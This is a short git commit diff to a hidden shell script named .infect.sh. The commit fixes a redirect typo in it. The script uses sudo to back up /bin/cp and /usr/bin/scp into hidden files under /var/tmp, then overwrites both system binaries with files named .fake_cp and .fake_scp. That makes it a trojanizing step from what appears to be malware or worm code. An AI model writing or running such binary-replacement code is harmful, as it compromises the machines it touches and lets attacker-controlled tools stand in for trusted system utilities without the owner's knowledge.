089ced204b9452069a4ca268bb4f85207d18f366
lagoon0o0 <lagoonzxy@gmail.com>
2016-12-18 20:04:48 +0800

    .infect.sh fixed

--- src/.infect.sh
+++ src/.infect.sh
@@ -1,4 +1,4 @@
-sudo cp -f /bin/cp /var/tmp/.cp >2 errlog
+sudo cp -f /bin/cp /var/tmp/.cp 2> errlog
 sudo cp -f /usr/bin/scp /var/tmp/.scp 2> errlog
 sudo mv -f /var/tmp/.fake_cp /bin/cp 2> errlog
 sudo mv -f /var/tmp/.fake_scp /usr/bin/scp 2> errlog
